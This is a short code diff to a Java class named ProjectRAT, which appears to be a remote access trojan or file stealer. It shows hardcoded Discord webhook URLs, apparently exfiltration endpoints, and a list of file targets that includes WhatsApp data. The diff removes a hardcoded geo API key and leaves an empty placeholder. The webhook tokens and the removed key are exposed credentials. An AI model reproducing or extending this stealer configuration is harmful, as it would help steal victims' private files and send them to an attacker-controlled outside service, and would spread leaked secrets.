@@ -17,7 +17,8 @@ public class ProjectRAT {
             "https://discord.com/api/webhooks/887386132428496896/AsB2Kq338Yw400rVgU4KNixEU1CKXy-Q3_IsvPcpUrRgDV5R9unkAl-LH43t7SryKMfi",
             "https://discord.com/api/webhooks/887386238565384262/OnMXKLdw0uSr2ZAJAGtcewIoRYgIure6Ka6Z70uTxQUQdBh1Vd3BmjnhaC5uKOBvVLWW"
     };
-    public static String apiKey = "b4ee6a619f9b4212a33f8881459d2cb7";
+    // put geo api key here
+    public static String apiKey = "";
     public static List<String> grabsFilesName = Arrays.asList(
             "src",
             "WhatsApp",
